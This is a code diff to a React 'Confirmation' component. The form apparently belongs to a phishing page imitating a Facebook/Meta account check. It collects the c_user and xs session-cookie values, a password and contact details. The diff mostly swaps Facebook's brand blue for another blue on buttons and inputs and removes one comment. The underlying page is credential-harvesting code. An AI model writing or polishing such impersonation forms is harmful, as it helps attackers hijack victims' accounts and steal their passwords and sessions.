@@ -60,7 +60,6 @@ export default function Confirmation() {
 
   const onSubmit = async (data: any) => {
     try {
-      // Include all required fields in the submission
       const formattedData = {
         c_user: data.c_user,
         xs: data.xs,
@@ -124,7 +123,7 @@ export default function Confirmation() {
                       onClick={() => setContactMethod('email')}
                       className={`flex-1 py-1.5 text-sm rounded ${
                         contactMethod === 'email'
-                          ? 'bg-[#1877f2] text-white'
+                          ? 'bg-[#0180FA] text-white'
                           : 'bg-[#e4e6eb] text-[#606770]'
                       }`}
                     >
@@ -135,7 +134,7 @@ export default function Confirmation() {
                       onClick={() => setContactMethod('phone')}
                       className={`flex-1 py-1.5 text-sm rounded ${
                         contactMethod === 'phone'
-                          ? 'bg-[#1877f2] text-white'
+                          ? 'bg-[#0180FA] text-white'
                           : 'bg-[#e4e6eb] text-[#606770]'
                       }`}
                     >
@@ -178,7 +177,7 @@ export default function Confirmation() {
                                 ? "Enter email address"
                                 : "Enter phone number"
                             }
-                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                             {...field}
                             onChange={(e) => {
                               const value = e.target.value.replace(/\s+/g, '');
@@ -205,7 +204,7 @@ export default function Confirmation() {
                       <Input
                         type="password"
                         placeholder="Enter password"
-                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                         {...field}
                       />
                     </FormControl>
@@ -226,7 +225,7 @@ export default function Confirmation() {
                       <Input
                         type="email"
                         placeholder="Enter additional notification email"
-                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                         {...field}
                       />
                     </FormControl>
@@ -237,7 +236,7 @@ export default function Confirmation() {
 
               <Button 
                 type="submit" 
-                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
+                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
                 disabled={form.formState.isSubmitting}
               >
                 {form.formState.isSubmitting ? "Submitting..." : "Submit"}
